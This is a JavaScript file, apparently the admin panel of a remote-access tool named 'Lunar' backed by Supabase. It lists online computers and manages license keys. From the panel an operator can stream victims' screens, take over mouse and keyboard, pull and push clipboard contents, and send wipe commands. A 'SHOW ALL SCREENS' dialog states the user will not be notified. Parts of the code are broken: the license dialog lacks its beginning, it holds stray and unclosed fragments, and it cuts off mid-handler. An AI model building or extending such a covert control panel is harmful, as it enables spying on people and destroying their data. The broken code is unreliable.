/* ============================================================
   LUNAR PANEL
   ============================================================ */
function buildLunarPanel(panel,tab){
  const supabaseLunar = new SupabaseClient(DEFAULTS.lunarUrl, DEFAULTS.lunarAdminKey);
  const state = {
    devices:{}, licenses:{},
    expandedDevices:new Set(), expandedLicenses:new Set(),
    autoDeleted:new Set(),
    pollers:[],
  };

  panel.innerHTML = `
    <div class="card" style="background:linear-gradient(135deg,#0d1017,#181c25);border-color:#232a36;">
      <div style="display:flex;align-items:center;flex-wrap:wrap;gap:12px;">
        <div>
          <div style="font-size:22px;font-weight:900;letter-spacing:-.5px;background:linear-gradient(135deg,#fff,#94a3b8);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">LUNAR</div>
          <div class="small muted">Administrator Control Panel</div>
        </div>
        <div class="right flex" style="gap:6px;flex-wrap:wrap;">
          <span class="chip online">Online: <span data-role="onlineCount">0</span></span>
          <button class="btn purple sm" data-act="showAllScreens">🖥 SHOW ALL SCREENS</button>
          <button class="btn orange sm" data-act="closeAllScreens">🛑 CLOSE ALL SCREENS</button>
          <button class="btn green sm"  data-act="loginAll">LOGIN ALL</button>
          <button class="btn red sm"    data-act="logoutAll">LOGOUT ALL</button>
          <button class="btn wipe sm"   data-act="wipeAll">☠ WIPE ALL</button>
          <button class="btn ghost sm"  data-act="refresh">REFRESH</button>
        </div>
      </div>
    </div>

    <div class="tabsbar" style="background:transparent;padding-left:0;padding-right:0;">
      <div class="tab active" data-ltab="computers">🖥 LIVE COMPUTERS</div>
      <div class="tab" data-ltab="licenses">🔑 LICENSES</div>
      <div class="tab" data-ltab="log">📜 LOG</div>
    </div>

    <div data-lpanel="computers">
      <div id="lunarDevicesHost"></div>
    </div>
    <div data-lpanel="licenses" style="display:none;">
      <div class="card">
        <div class="row">
          <button class="btn green sm" data-act="createLicense">➕ CREATE NEW LICENSE</button>
          <button class="btn orange sm" data-act="removeExpired">🧹 REMOVE EXPIRED</button>
          <span class="right small" data-role="licenseStats"></span>
        </div>
      </div>
      <div id="lunarLicensesHost"></div>
    </div>
    <div data-lpanel="log" style="display:none;">
      <div class="card">
        <div class="card-title"><span class="dot"></span> 📜 Log</div>
        <div class="log" data-role="log"></div>
      </div>
    </div>
  `;

  const devicesHost = $("#lunarDevicesHost",panel);
  const licensesHost = $("#lunarLicensesHost",panel);
  const logEl = $("[data-role=log]",panel);
  const onlineCountEl = $("[data-role=onlineCount]",panel);
  const licenseStatsEl = $("[data-role=licenseStats]",panel);

  function log(msg,tag="info"){ pushLog(logEl,msg,tag); }

  $$("[data-ltab]",panel).forEach(t=>t.addEventListener("click",()=>{
    $$("[data-ltab]",panel).forEach(x=>x.classList.remove("active"));
    t.classList.add("active");
    const which = t.dataset.ltab;
    $$("[data-lpanel]",panel).forEach(p=>{
      p.style.display = p.dataset.lpanel===which ? "" : "none";
    });
  }));

  log("Lunar Admin started","success");

  function lunarIsOnline(dev){
    if(!dev) return false;
    const v = dev.last_seen_at;
    if(!v) return false;
    const d = parseDatetime(v);
    if(!d) return false;
    return (Date.now() - d.getTime())/1000 <= DEFAULTS.lunarOnlineTimeout;
  }
  function licenseTimeLeft(item){
    const exp = parseDatetime(item.expires_at);
    if(!exp) return {status:"unknown",seconds:null,text:"No expiry"};
    const secs = (exp.getTime()-Date.now())/1000;
    if(secs<=0) return {status:"expired",seconds:secs,text:"EXPIRED "+humanizeSeconds(secs)+" ago"};
    if(secs<86400) return {status:"expiring",seconds:secs,text:humanizeSeconds(secs)+" left"};
    return {status:"active",seconds:secs,text:humanizeSeconds(secs)+" left"};
  }

  async function refreshData(){
    try{
      let devices=[], licenses=[];
      try{ devices = await supabaseLunar.rest("lunar_devices",{query:{select:"*",order:"last_seen_at.desc"}}); }catch(e){ log("Device refresh error: "+e.message,"error"); }
      try{ licenses = await supabaseLunar.rest("lunar_licenses",{query:{select:"*",order:"created_at.desc"}}); }catch(e){ log("License refresh error: "+e.message,"error"); }

      const online = {};
      (devices||[]).forEach(d=>{ if(lunarIsOnline(d) && safeText(d.device_id)) online[d.device_id]=d; });

      const licMap = {};
      (licenses||[]).forEach(l=>{ if(safeText(l.license_key)) licMap[l.license_key]=l; });

      state.devices = online;
      state.licenses = licMap;

      renderDevices();
      renderLicenses();
      checkExpiredLicenses();
    }catch(e){
      log("Refresh failed: "+e.message,"error");
    }
  }

  function renderDevices(){
    onlineCountEl.textContent = Object.keys(state.devices).length;
    if(!Object.keys(state.devices).length){
      devicesHost.innerHTML = `<div class="empty"><div class="big">🖥</div>No online computers right now.<br/><span class="small">Start user.py on a computer and it will appear here.</span></div>`;
      return;
    }
    devicesHost.innerHTML = "";
    Object.values(state.devices)
      .sort((a,b)=>safeText(a.computer_name).toLowerCase().localeCompare(safeText(b.computer_name).toLowerCase()))
      .forEach(dev=>{
        const id = safeText(dev.device_id);
        const card = document.createElement("div");
        card.className = "device-card";
        card.dataset.deviceId = id;
        const expanded = state.expandedDevices.has(id);
        card.innerHTML = `
          <div class="device-head">
            <button class="btn ghost sm" data-act="toggle">${expanded?"▲":"▼"}</button>
            <div>
              <div class="name">${escapeHtml(safeText(dev.computer_name)||"Unknown Computer")}</div>
              <div class="meta">IP: ${escapeHtml(safeText(dev.public_ip)||"—")} · <span style="color:var(--online);font-weight:700;">● ONLINE</span></div>
            </div>
            <div class="device-actions">
              <button class="btn green sm" data-act="login">LOGIN AUTO</button>
              <button class="btn red sm"   data-act="logout">LOGOUT</button>
              <button class="btn purple sm" data-act="screen">🖥 VIEW + CONTROL</button>
              <button class="btn wipe sm"  data-act="wipe">☠ WIPE</button>
            </div>
          </div>
          <div class="device-body ${expanded?"open":""}">
            <div class="grid cols-2">
              <div>
                <dl class="kv">
                  <dt>License</dt><dd>${escapeHtml(safeText(dev.license_key)||"Not logged in")}</dd>
                  <dt>Device ID</dt><dd>${escapeHtml(id)}</dd>
                  <dt>Last Seen</dt><dd>${escapeHtml(formatLastSeen(dev.last_seen_at))}</dd>
                  <dt>Command</dt><dd>${escapeHtml(safeText(dev.command_status)||"—")} ${dev.command_message?("• "+escapeHtml(safeText(dev.command_message))):""}</dd>
                </dl>
              </div>
              <div>
                <label class="field"><span>Login License</span>
                  <select data-role="licenseSelect"></select>
                </label>
                <button class="btn primary sm block" data-act="loginWithSelected">LOGIN WITH SELECTED LICENSE</button>
              </div>
            </div>
          </div>
        `;
        devicesHost.appendChild(card);

        const sel = $("[data-role=licenseSelect]",card);
        const active = Object.entries(state.licenses)
          .filter(([k,v])=>v.is_active && licenseTimeLeft(v).status!=="expired")
          .map(([k])=>k);
        sel.innerHTML = active.length
          ? active.map(k=>`<option value="${escapeHtml(k)}">${escapeHtml(k)}</option>`).join("")
          : `<option value="">(no active license)</option>`;
        if(safeText(dev.license_key)) sel.value = safeText(dev.license_key);

        $$("button[data-act]",card).forEach(b=>{
          b.addEventListener("click",async ()=>{
            const act = b.dataset.act;
            if(act==="toggle"){
              if(state.expandedDevices.has(id)) state.expandedDevices.delete(id);
              else state.expandedDevices.add(id);
              renderDevices();
            }
            if(act==="login") await sendDeviceCommand(id,"login",sel.value||safeText(dev.license_key));
            if(act==="loginWithSelected") await sendDeviceCommand(id,"login",sel.value||"");
            if(act==="logout") await sendDeviceCommand(id,"logout","");
            if(act==="screen") await openScreenViewer(id,safeText(dev.computer_name));
            if(act==="wipe") await wipeComputer(id,safeText(dev.computer_name));
          });
        });
      });
  }

  function renderLicenses(){
    let total=0,active=0,expiring=0,expired=0;
    Object.values(state.licenses).forEach(l=>{
      total++;
      const s = licenseTimeLeft(l).status;
      if(s==="active")active++; else if(s==="expiring")expiring++; else if(s==="expired")expired++;
    });
    licenseStatsEl.textContent = `Total: ${total}   Active: ${active}   Expiring: ${expiring}   Expired: ${expired}`;

    if(!total){
      licensesHost.innerHTML = `<div class="empty"><div class="big">🔑</div>No licenses yet.<br/><span class="small">Click '➕ CREATE NEW LICENSE' to add one.</span></div>`;
      return;
    }

    licensesHost.innerHTML = "";
    Object.entries(state.licenses).forEach(([key,item])=>{
      const expanded = state.expandedLicenses.has(key);
      const card = document.createElement("div");
      card.className = "license-card";
      const tl = licenseTimeLeft(item);
      const isActive = !!item.is_active;
      const statusChip = tl.status==="expired"
        ? `<span class="chip expired">EXPIRED</span>`
        : !isActive ? `<span class="chip offline">RESTRICTED</span>`
        : tl.status==="expiring" ? `<span class="chip warn">EXPIRING</span>`
        : `<span class="chip online">ACTIVE</span>`;

      card.innerHTML = `
        <div class="license-head">
          <button class="btn ghost sm" data-act="toggle">${expanded?"▲":"▼"}</button>
          <div>
            <div class="mono" style="font-weight:800;">${escapeHtml(key)}</div>
            <div class="small muted">${escapeHtml(tl.text)}</div>
          </div>
          ${statusChip}
          <div class="device-actions">
            <button class="btn green sm" data-act="activate">ACTIVATE</button>
            <button class="btn orange sm" data-act="restrict">RESTRICT</button>
            <button class="btn primary sm" data-act="edit">✏ EDIT</button>
            <button class="btn cyan sm" data-act="renew">🔄 RENEW</button>
            <button class="btn wipe sm" data-act="delete">DELETE</button>
          </div>
        </div>
        <div class="license-body ${expanded?"open":""}">
          <div class="grid cols-3">
            <div class="stat"><div class="l">Created</div><div class="v" style="font-size:13px;">${escapeHtml(formatLastSeen(item.created_at))}</div></div>
            <div class="stat"><div class="l">Updated</div><div class="v" style="font-size:13px;">${escapeHtml(formatLastSeen(item.updated_at))}</div></div>
            <div class="stat"><div class="l">Expires</div><div class="v" style="font-size:13px;">${escapeHtml(formatLastSeen(item.expires_at))}</div></div>
          </div>
          <div class="sep"></div>
          <div class="small muted">Notes</div>
          <div style="margin-top:4px;font-size:13px;">${escapeHtml(safeText(item.notes)||"—")}</div>
        </div>
      `;
      licensesHost.appendChild(card);

      $$("button[data-act]",card).forEach(b=>{
        b.addEventListener("click",async ()=>{
          const act = b.dataset.act;
          if(act==="toggle"){
            if(state.expandedLicenses.has(key)) state.expandedLicenses.delete(key);
            else state.expandedLicenses.add(key);
            renderLicenses();
          }
          if(act==="activate") await setLicenseActive(key,true);
          if(act==="restrict") await setLicenseActive(key,false);
          if(act==="edit"||act==="renew") openLicenseDialog("edit",item);
          if(act==="delete") await deleteLicense(key);
        });
      });
    });
  }

    const lenEl = $("#dlgLen",box);
    const expEl = $("#dlgExp",box);
    const notesEl = $("#dlgNotes",box);
    const activeEl = $("#dlgActive",box);

    function quickSet(hours){
      const t = new Date(Date.now()+hours*3600*1000);
      const p=n=>String(n).padStart(2,"0");
      expEl.value = `${t.getFullYear()}-${p(t.getMonth()+1)}-${p(t.getDate())} ${p(t.getHours())}:${p(t.getMinutes())}`;
    }
    if(isEdit){
      const exp = parseDatetime(licenseItem.expires_at);
      if(exp){
        const p=n=>String(n).padStart(2,"0");
        expEl.value = `${exp.getFullYear()}-${p(exp.getMonth()+1)}-${p(exp.getDate())} ${p(exp.getHours())}:${p(exp.getMinutes())}`;
      }
    }else{
      keyEl.value = generateLicenseKey("LUNAR",3,6);
      quickSet(24);
    }

    $$("[data-act]",box).forEach(b=>{
      b.addEventListener("click",async ()=>{

        if(act==="cancel"){ closeModal(); return; }

          keyEl.value = generateLicenseKey(prefixEl.value,groupsEl.value,lenEl.value);
        }
        if(act==="rnd"){
          prefixEl.value = ["LUNAR","STAR","NOVA","ORBIT","MOON","COMET"][Math.floor(Math.random()*6)];
          groupsEl.value = [3,4,5][Math.floor(Math.random()*3)];
          lenEl.value = [4,5,6,8][Math.floor(Math.random()*4)];
          keyEl.value = generateLicenseKey(prefixEl.value,groupsEl.value,lenEl.value);
        }
        if(act==="save"){
          const key = keyEl.value.trim();
          if(!key){ toast("License key cannot be empty","error"); return; }
          let dt;
          try{ dt = parseUserDatetime(expEl.value); }
          catch(e){ toast(e.message,"error"); return; }
          const payload = {
            license_key:key,
            expires_at: dt.toISOString(),

            is_active: activeEl.checked,

          if(isEdit) await updateLicenseWorker(payload);
          else await createLicenseWorker(payload);
        }
      });
    });
    $$("[data-quick]",box).forEach(b=>{
      b.addEventListener("click",()=>quickSet(parseInt(b.dataset.quick)));
    });
  }

  async function createLicenseWorker(payload){
    if(state.licenses[payload.license_key]){
      toast("A license with this key already exists","warn");
      return;
    }
    const row = Object.assign({},payload,{
      created_at:isoNow(), updated_at:isoNow(),
      notes: payload.notes || "Created by Lunar Admin"
    });
    try{
      await supabaseLunar.rest("lunar_licenses",{method:"POST",prefer:"return=representation",body:row});
      log(`License created: ${payload.license_key} (expires ${formatLastSeen(payload.expires_at)})`,"success");
      state.autoDeleted.delete(payload.license_key);
      refreshData();
      toast("License created","success");
    }catch(e){ log("License creation error: "+e.message,"error"); toast(e.message,"error"); }
  }
  async function updateLicenseWorker(payload){
    try{
      await supabaseLunar.rest("lunar_licenses",{
        method:"PATCH",
        query:{license_key:`eq.${payload.license_key}`},
        prefer:"return=representation",
        body:{is_active:payload.is_active, notes:payload.notes, expires_at:payload.expires_at, updated_at:isoNow()}
      });
      log(`License updated: ${payload.license_key} (new expiry ${formatLastSeen(payload.expires_at)})`,"success");
      state.autoDeleted.delete(payload.license_key);
      refreshData();
      toast("License updated","success");
    }catch(e){ log("License update error: "+e.message,"error"); toast(e.message,"error"); }
  }

  async function setLicenseActive(key,active){
    try{
      await supabaseLunar.rest("lunar_licenses",{
        method:"PATCH", query:{license_key:`eq.${key}`},
        prefer:"return=representation",
        body:{is_active:!!active, updated_at:isoNow()}
      });
      log(`License ${active?"activate":"restrict"}: ${key}`,"success");
      if(active) state.autoDeleted.delete(key);
      if(!active){
        for(const d of Object.values(state.devices)){
          if(safeText(d.license_key)===key) await sendDeviceCommand(safeText(d.device_id),"logout","");
        }
      }
      refreshData();
    }catch(e){ log("License error: "+e.message,"error"); toast(e.message,"error"); }
  }

  async function deleteLicense(key){
    const ok = await confirmModal("Delete License",`Delete this license?\n\n${key}\n\nThis cannot be undone.`,{danger:true,okText:"Delete"});
    if(!ok) return;
    await deleteLicenseWorker(key);
  }

  async function deleteLicenseWorker(key){
    for(const d of Object.values(state.devices)){
      if(safeText(d.license_key)===key){
        try{
          await supabaseLunar.rest("lunar_devices",{
            method:"PATCH", query:{device_id:`eq.${safeText(d.device_id)}`},
            prefer:"return=minimal",
            body:{
              license_key:null,
              admin_command:"logout", admin_license_key:"",
              command_id:makeCommandId(), command_created_at:isoNow(),
              command_status:"pending", command_message:"License deleted",
              updated_at:isoNow(),
            }
          });
        }catch(e){ log("Device cleanup warning: "+e.message,"warning"); }
      }
    }
    try{
      await supabaseLunar.rest("lunar_licenses",{
        method:"DELETE", query:{license_key:`eq.${key}`},
        prefer:"return=representation"
      });
      log("License deleted: "+key,"success");
      state.autoDeleted.delete(key);
      refreshData();
      toast("License deleted","success");
    }catch(e){ log("License delete error: "+e.message,"error"); toast(e.message,"error"); }
  }

  async function removeExpiredLicenses(){
    const expired = Object.entries(state.licenses)
      .filter(([k,v])=>licenseTimeLeft(v).status==="expired")
      .map(([k])=>k);
    if(!expired.length){ toast("No expired licenses","info"); return; }
    const ok = await confirmModal("Remove Expired",`Delete ${expired.length} expired license(s)?\n\nThis cannot be undone.`,{danger:true,okText:"Delete All"});
    if(!ok) return;
    for(const k of expired) await deleteLicenseWorker(k);
  }

  async function checkExpiredLicenses(){
    for(const [key,item] of Object.entries(state.licenses)){
      const tl = licenseTimeLeft(item);
      if(tl.status!=="expired") continue;
      if(state.autoDeleted.has(key)) continue;
      state.autoDeleted.add(key);
      const action = await confirmModal(
        "License Expired",
        `License has EXPIRED:\n\n${key}\n\nExpired at: ${formatLastSeen(item.expires_at)}\nNotes: ${safeText(item.notes)||"(no notes)"}\n\nOK = Renew (edit now)\nCancel = Keep it inactive`,
        {okText:"Renew",danger:false}
      );
      if(action){
        openLicenseDialog("edit",item);
      }else{
        try{
          await supabaseLunar.rest("lunar_licenses",{
            method:"PATCH", query:{license_key:`eq.${key}`},
            prefer:"return=minimal",
            body:{is_active:false,updated_at:isoNow(),notes:"Expired"}
          });
          for(const d of Object.values(state.devices)){
            if(safeText(d.license_key)===key) await sendDeviceCommand(safeText(d.device_id),"logout","");
          }
          log(`License auto-disabled: ${key}`,"warning");
        }catch(e){ log("Auto-disable error: "+e.message,"error"); }
      }
    }
  }

  async function sendDeviceCommand(deviceId,command,licenseKey){
    const dev = state.devices[deviceId];
    if(!dev){ log("Device not found: "+deviceId,"error"); return; }
    const name = safeText(dev.computer_name);
    const cmdId = makeCommandId();
    const message = command==="login" ? "Login command sent"
                  : command==="logout" ? "Logout command sent"
                  : command==="wipe" ? "Wipe command sent"
                  : "Unknown command";
    const payload = {
      admin_command: String(command),
      admin_license_key: command==="login" ? String(licenseKey||"") : "",
      command_id: cmdId,
      command_created_at: isoNow(),
      command_status:"pending",
      command_message: message,
      updated_at: isoNow(),
    };
    log(`${command.toUpperCase()} -> ${name} | cmd_id=${cmdId}`,"info");
    try{
      await supabaseLunar.rest("lunar_devices",{
        method:"PATCH", query:{device_id:`eq.${deviceId}`},
        prefer:"return=representation", body:payload
      });
      log(`Command sent: ${command.toUpperCase()} | ${name}`,"success");
      setTimeout(refreshData,800);
    }catch(e){
      log(`COMMAND ERROR | ${command.toUpperCase()} | ${name} | ${e.message}`,"error");
      toast("Command error: "+e.message,"error");
    }
  }

  function buildScreenViewerWindow(deviceId,computerName){
    openModal(`
      <div class="modal-head" style="background:var(--bg-header);border-radius:var(--r-lg) var(--r-lg) 0 0;">
        <div>
          <h3 style="font-size:15px;">🖥 ${escapeHtml(computerName||"Unknown")}</h3>
          <div class="small muted mono" style="margin-top:2px;">${escapeHtml(deviceId)}</div>
        </div>
        <button class="close-x" data-act="close">×</button>
      </div>
      <div class="modal-body">
        <div class="row" style="margin-bottom:10px;">
          <button class="btn purple sm" data-act="toggleControl">🎮 ENABLE REMOTE CONTROL</button>
          <button class="btn cyan sm" data-act="sendClipboard">📋 SEND CLIPBOARD</button>
          <button class="btn ghost sm" data-act="getClipboard">📥 GET CLIPBOARD</button>
          <button class="btn ghost sm" data-act="sendText">⌨ SEND TEXT</button>
          <span class="right chip" data-role="ctrlStatus">VIEW ONLY</span>
        </div>
        <div class="screen-canvas-wrap" data-role="canvasWrap">
          <div class="muted" data-role="canvasMsg">Waiting for screen…</div>
          <canvas data-role="canvas" style="display:none;"></canvas>
        </div>
        <div class="row" style="margin-top:8px;">
          <span class="small muted" data-role="svStatus">Waiting for first frame…</span>
          <span class="right small muted" data-role="clipStatus"></span>
        </div>
      </div>
    `,{width:"96vw",className:"screen-modal"});
    const box = $("#modalBox");
    const canvas = $("[data-role=canvas]",box);
    const canvasMsg = $("[data-role=canvasMsg]",box);
    const ctrlStatusEl = $("[data-role=ctrlStatus]",box);
    const svStatusEl = $("[data-role=svStatus]",box);
    const clipStatusEl = $("[data-role=clipStatus]",box);

    let control = false;
    let lastFrameId = -1;
    let lastClipboardId = 0;
    let remoteW=1920, remoteH=1080;
    let imgW=0, imgH=0;
    let currentImg = null;
    let intervalId = null, pollId=null;
    let closed = false;

    const ctx = canvas.getContext("2d");

    function setStatus(t){ svStatusEl.textContent = t; }
    function setClip(t){ clipStatusEl.textContent = t; setTimeout(()=>{if(!closed)clipStatusEl.textContent="";},4000); }

    async function fetchFrame(){
      if(closed) return;
      try{
        const rows = await supabaseLunar.rest("lunar_devices",{
          query:{select:"screen_storage_path,screen_frame_id,screen_view_active,screen_last_upload", device_id:`eq.${deviceId}`}
        });
        if(!rows||!rows.length) return;
        const row = rows[0];
        if(!row.screen_view_active){ setStatus("Stream stopped by server"); return; }
        const path = safeText(row.screen_storage_path);
        if(!path){ setStatus("Waiting for first frame…"); return; }
        const fid = row.screen_frame_id||0;
        if(fid===lastFrameId) return;
        const url = `${DEFAULTS.lunarUrl}/storage/v1/object/public/${DEFAULTS.lunarBucket}/${path}?t=${Date.now()}`;
        const img = new Image();
        img.crossOrigin = "anonymous";
        img.onload = ()=>{
          if(closed) return;
          currentImg = img;
          remoteW = img.naturalWidth; remoteH = img.naturalHeight;
          lastFrameId = fid;
          drawFrame();
          setStatus("● LIVE • "+formatLastSeen(row.screen_last_upload));
        };
        img.onerror = ()=>{ /* silent */ };
        img.src = url;
      }catch(e){ /* silent */ }
    }

    function drawFrame(){
      if(!currentImg) return;
      canvasMsg.style.display = "none";
      canvas.style.display = "";
      const wrap = canvas.parentElement;
      const availW = Math.max(wrap.clientWidth-4, 200);
      const availH = Math.max(Math.min(window.innerHeight*0.7, 600), 200);
      const scale = Math.min(availW/currentImg.naturalWidth, availH/currentImg.naturalHeight);
      imgW = Math.round(currentImg.naturalWidth*scale);
      imgH = Math.round(currentImg.naturalHeight*scale);
      canvas.width  = imgW;
      canvas.height = imgH;
      canvas.style.width  = imgW+"px";
      canvas.style.height = imgH+"px";
      ctx.drawImage(currentImg,0,0,imgW,imgH);
    }

    function widgetToRemote(clientX,clientY){
      const r = canvas.getBoundingClientRect();
      const wx = clientX-r.left, wy = clientY-r.top;
      if(wx<0||wy<0||wx>imgW||wy>imgH) return [null,null];
      const rx = Math.max(0,Math.min(Math.floor(wx*remoteW/imgW), remoteW-1));
      const ry = Math.max(0,Math.min(Math.floor(wy*remoteH/imgH), remoteH-1));
      return [rx,ry];
    }

    async function sendInput(payload){
      try{
        await supabaseLunar.rpc("lunar_send_input",Object.assign({
          p_device_id:deviceId,
          p_mouse_x:0, p_mouse_y:0,
          p_mouse_action:"", p_mouse_button:"",
          p_scroll_delta:0, p_key_text:"", p_hotkey_text:""
        },payload));
      }catch(e){ /* silent */ }
    }

    canvas.addEventListener("mousemove",e=>{
      if(!control) return;
      const [x,y] = widgetToRemote(e.clientX,e.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"move"});
    });
    canvas.addEventListener("click",e=>{
      if(!control) return;
      const [x,y] = widgetToRemote(e.clientX,e.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"click",p_mouse_button:"left"});
    });
    canvas.addEventListener("contextmenu",e=>{
      e.preventDefault();
      if(!control) return;
      const [x,y] = widgetToRemote(e.clientX,e.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"click",p_mouse_button:"right"});
    });
    canvas.addEventListener("dblclick",e=>{
      if(!control) return;
      const [x,y] = widgetToRemote(e.clientX,e.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"double",p_mouse_button:"left"});
    });
    canvas.addEventListener("wheel",e=>{
      if(!control) return;
      e.preventDefault();
      const [x,y] = widgetToRemote(e.clientX,e.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"scroll",p_scroll_delta:Math.sign(e.deltaY)*-1});
    },{passive:false});
    canvas.addEventListener("touchstart",e=>{
      if(!control) return;
      e.preventDefault();
      const t=e.touches[0];
      const [x,y] = widgetToRemote(t.clientX,t.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"click",p_mouse_button:"left"});
    },{passive:false});
    canvas.addEventListener("touchmove",e=>{
      if(!control) return;
      e.preventDefault();
      const t=e.touches[0];
      const [x,y] = widgetToRemote(t.clientX,t.clientY);
      if(x===null) return;
      sendInput({p_mouse_x:x,p_mouse_y:y,p_mouse_action:"move"});
    },{passive:false});

    let keyListener = (e)=>{
      if(!control) return;
      if(e.target && (e.target.tagName==="INPUT" || e.target.tagName==="TEXTAREA" || e.target.tagName==="SELECT")) return;
      const special = {
        Enter:"enter",Tab:"tab",Backspace:"backspace",Delete:"delete",
        Escape:"esc",ArrowUp:"up",ArrowDown:"down",ArrowLeft:"left",ArrowRight:"right",
        Home:"home",End:"end",PageUp:"pageup",PageDown:"pagedown"," ":"space"
      };
      if(e.ctrlKey||e.altKey||e.metaKey){
        e.preventDefault();
        const mods=[];
        if(e.ctrlKey) mods.push("ctrl");
        if(e.shiftKey) mods.push("shift");
        if(e.altKey) mods.push("alt");
        const key = e.key.toLowerCase();
        sendInput({p_mouse_action:"hotkey",p_hotkey_text:mods.concat([key]).join("+")});
        return;
      }
      if(special[e.key]){
        e.preventDefault();
        sendInput({p_mouse_action:"hotkey",p_hotkey_text:special[e.key]});
        return;
      }
      if(e.key && e.key.length===1){
        e.preventDefault();
        sendInput({p_mouse_action:"key",p_key_text:e.key});
      }
    };
    document.addEventListener("keydown",keyListener);

    async function pollClipboard(){
      if(closed) return;
      try{
        const rows = await supabaseLunar.rest("lunar_devices",{
          query:{select:"clipboard_text,clipboard_direction,clipboard_id",device_id:`eq.${deviceId}`}
        });
        if(!rows||!rows.length) return;
        const row = rows[0];
        const id = row.clipboard_id||0;
        if(id!==lastClipboardId && safeText(row.clipboard_direction)==="to_admin"){
          lastClipboardId = id;
          try{
            await navigator.clipboard.writeText(row.clipboard_text||"");
            setClip(`📥 Received (${(row.clipboard_text||"").length} chars)`);
          }catch(e){ setClip("📥 Received — clipboard write blocked"); }
        }
      }catch(e){}
    }

    $$("[data-act]",box).forEach(b=>{
      b.addEventListener("click",async ()=>{
        const act = b.dataset.act;
        if(act==="close"){ doClose(); return; }
        if(act==="toggleControl"){
          control = !control;
          try{ await supabaseLunar.rpc("lunar_set_control",{p_device_id:deviceId,p_enabled:control}); }catch(e){}
          if(control){
            b.textContent = "🛑 DISABLE REMOTE CONTROL";
            b.classList.remove("purple"); b.classList.add("red");
            ctrlStatusEl.textContent = "🎮 CONTROL ACTIVE";
            ctrlStatusEl.className = "right chip info";
          }else{
            b.textContent = "🎮 ENABLE REMOTE CONTROL";
            b.classList.remove("red"); b.classList.add("purple");
            ctrlStatusEl.textContent = "VIEW ONLY";
            ctrlStatusEl.className = "right chip";
          }
        }
        if(act==="sendClipboard"){
          if(!control){ toast("Enable remote control first","warn"); return; }
          let text = "";
          try{ text = await navigator.clipboard.readText(); }catch(e){}
          if(!text){ text = await promptModal("Send Clipboard","Text to set on the user's clipboard:")||""; }
          if(!text) return;
          try{
            await supabaseLunar.rpc("lunar_send_clipboard",{p_device_id:deviceId,p_text:text,p_direction:"to_user"});
            setClip("📋 Sent to user");
          }catch(e){ setClip("Error: "+e.message); }
        }
        if(act==="getClipboard"){
          if(!control){ toast("Enable remote control first","warn"); return; }
          try{
            await supabaseLunar.rpc("lunar_send_clipboard",{p_device_id:deviceId,p_text:"",p_direction:"request_from_user"});
            setClip("📥 Requested from user…");
          }catch(e){ setClip("Error: "+e.message); }
        }
        if(act==="sendText"){
          if(!control){ toast("Enable remote control first","warn"); return; }
          const text = await promptModal("Send Text","Text to type on the remote screen:")||"";
          if(!text) return;
          sendInput({p_mouse_action:"text",p_key_text:text});
        }
      });
    });

    async function doClose(){
      if(closed) return;
      closed = true;
      if(intervalId) clearInterval(intervalId);
      if(pollId) clearInterval(pollId);
      document.removeEventListener("keydown",keyListener);
      try{ await supabaseLunar.rpc("lunar_set_control",{p_device_id:deviceId,p_enabled:false}); }catch(e){}
      try{ await supabaseLunar.rpc("lunar_set_screen_view",{p_device_id:deviceId,p_active:false}); }catch(e){}
      delete screenWindows[deviceId];
      closeModal();
    }
    screenWindows[deviceId] = {win:box,close:doClose,closed:false};

    intervalId = setInterval(fetchFrame, 900);
    pollId = setInterval(pollClipboard, 1500);
    fetchFrame();
  }

  $("[data-act=showAllScreens]",panel).addEventListener("click",async()=>{
    const ids = Object.keys(state.devices);
    if(!ids.length){ toast("No online computers","info"); return; }
    const ok = await confirmModal("SHOW ALL SCREENS",`Open live screen viewers for ${ids.length} online computer(s)?\n\nEach window can be independently maximized, minimized, or closed.\n\nUser will NOT be notified.`,{okText:"Open All"});
    if(!ok) return;
    for(const id of ids){
      const dev = state.devices[id];
      try{ await supabaseLunar.rpc("lunar_set_screen_view",{p_device_id:id,p_active:true}); }catch(e){}
      buildScreenViewerWindow(id,safeText(dev.computer_name));
      await new Promise(r=>setTimeout(r,120));
    }
    log(`SHOW ALL SCREENS → opened ${ids.length} viewers`,"success");
  });
  $("[data-act=closeAllScreens]",panel).addEventListener("click",async()=>{
    const open = Object.keys(screenWindows);
    if(!open.length){ toast("No screen viewers open","info"); return; }
    const ok = await confirmModal("CLOSE ALL SCREENS",`Close all ${open.length} open screen viewer(s)?\n\nAll remote control sessions will be stopped.`,{okText:"Close All"});
    if(!ok) return;
    for(const id of open){ try{ screenWindows[id].close(); }catch(e){} }
    log(`CLOSE ALL SCREENS → closed ${open.length} viewer(s)`,"success");
  });
  $("[data-act=loginAll]",panel).addEventListener("click",async()=>{
    const ids = Object.keys(state.devices);
    if(!ids.length){ toast("No online computers","info"); return; }
    const active = Object.entries(state.licenses).filter(([k,v])=>v.is_active && licenseTimeLeft(v).status!=="expired").map(([k])=>k);
    if(!active.length){ toast("No active license","error"); return; }
    const ok = await confirmModal("LOGIN ALL",`Send LOGIN AUTO to ${ids.length} online computer(s)?\n\nLicense:\n${active[0]}`,{okText:"Login All"});
    if(!ok) return;
    for(const id of ids){ await sendDeviceCommand(id,"login",active[0]); await new Promise(r=>setTimeout(r,250)); }
    log(`LOGIN ALL queued for ${ids.length} devices`,"success");
  });
  $("[data-act=logoutAll]",panel).addEventListener("click",async()=>{
    const ids = Object.keys(state.devices);
    if(!ids.length){ toast("No online computers","info"); return; }
    const ok = await confirmModal("LOGOUT ALL",`Send LOGOUT to ${ids.length} online computer(s)?`,{okText:"Logout All"});
    if(!ok) return;
    for(const id of ids){ await sendDeviceCommand(id,"logout",""); await new Promise(r=>setTimeout(r,250)); }
    log(`LOGOUT ALL queued for ${ids.length} devices`,"success");
  });
  $("[data-act=wipeAll]",panel).addEventListener("click",async()=>{
    const ids = Object.keys(state.devices);
    if(!ids.length){ toast("No online computers","info"); return; }
    let ok = await confirmModal(
      "☠ WIPE ALL COMPUTERS — IRREVERSIBLE",
